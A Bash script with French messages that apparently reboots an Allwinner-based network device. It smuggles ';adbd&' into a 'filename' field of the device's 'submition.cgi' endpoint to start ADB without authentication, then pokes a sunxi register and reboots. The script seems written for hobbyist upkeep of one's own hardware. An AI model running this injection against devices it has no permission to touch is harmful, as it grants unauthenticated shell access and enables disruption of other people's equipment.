#!/usr/bin/env bash
set -Eeuo pipefail

# Usage : ./adb-reboot.sh [adresse IPv4 ou nom d'hôte]
host="${1:-192.168.1.101}"
target="${host}:5555"
curl_pid=''

fail() {
    printf 'Erreur : %s\n' "$*" >&2
    exit 1
}

cleanup() {
    if [[ -n "$curl_pid" ]]; then
        kill "$curl_pid" 2>/dev/null || true
        wait "$curl_pid" 2>/dev/null || true
    fi
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

[[ $# -le 1 && "$host" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*$ ]] ||
    fail "Usage : $0 [adresse IPv4 ou nom d'hôte]"

for command in curl adb; do
    command -v "$command" >/dev/null 2>&1 || fail "Commande manquante : $command"
done

printf 'Démarrage de adbd sur %s…\n' "$host"
# Le CGI peut rester ouvert pendant que adbd tourne : ne pas attendre sa fin.
# La disponibilité réelle du service est vérifiée avec ADB ci-dessous.
curl --silent --show-error --fail --noproxy '*' \
    --connect-timeout 3 --max-time 10 \
    --request POST --data 'x' \
    "http://${host}/cgi-bin/submition.cgi?filename=a;adbd&" \
    >/dev/null 2>&1 &
curl_pid=$!

sleep 2
printf 'Connexion ADB à %s…\n' "$target"
connected=false
for ((attempt = 1; attempt <= 10; attempt++)); do
    # adb connect peut retourner zéro même si la connexion a échoué.
    adb connect "$target" >/dev/null 2>&1 || true
    if [[ "$(adb -s "$target" get-state 2>/dev/null || true)" == device ]]; then
        connected=true
        break
    fi
    sleep 1
done
[[ "$connected" == true ]] || fail "Connexion ADB impossible à $target."

printf 'Écriture du registre…\n'
adb -s "$target" shell \
    'echo 0x07090108 0x5aa5a55a > /sys/class/sunxi_dump/write' ||
    fail "Échec de l’écriture ; redémarrage annulé."

printf 'Redémarrage…\n'
adb -s "$target" reboot || fail "Échec de la commande de redémarrage."
printf 'Commande de redémarrage envoyée.\n'
